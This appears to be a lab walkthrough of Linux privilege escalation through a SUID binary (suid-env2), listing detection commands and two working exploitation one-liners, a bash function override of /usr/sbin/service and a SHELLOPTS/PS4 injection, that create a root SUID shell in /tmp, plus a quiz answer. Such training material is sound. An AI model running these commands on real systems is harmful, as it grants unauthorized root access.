**Detection**

  

Linux VM

  

1. In command prompt type: 
   
```
find / -type f -perm -04000 -ls 2>/dev/null
```

![[Pasted image 20240602231936.png]]

2. From the output, make note of all the SUID binaries.

3. In command prompt type: 
   
```
strings /usr/local/bin/suid-env2
```

![[Pasted image 20240602232006.png]]


4. From the output, notice the functions used by the binary.
  

**Exploitation Method #1**

Linux VM

1. In command prompt type:

```
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```

2. In command prompt type:

```
export -f /usr/sbin/service
```

3. In command prompt type: 

```
/usr/local/bin/suid-env2
```

![[Pasted image 20240602232043.png]]


**Exploitation Method #2**

Linux VM

1. In command prompt type:

```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

![[Pasted image 20240602232253.png]]


Answer the questions below

| Question                                                                | Answer                          |
| ----------------------------------------------------------------------- | ------------------------------- |
| What is the last line of the "strings /usr/local/bin/suid-env2" output? | /usr/sbin/service apache2 start |
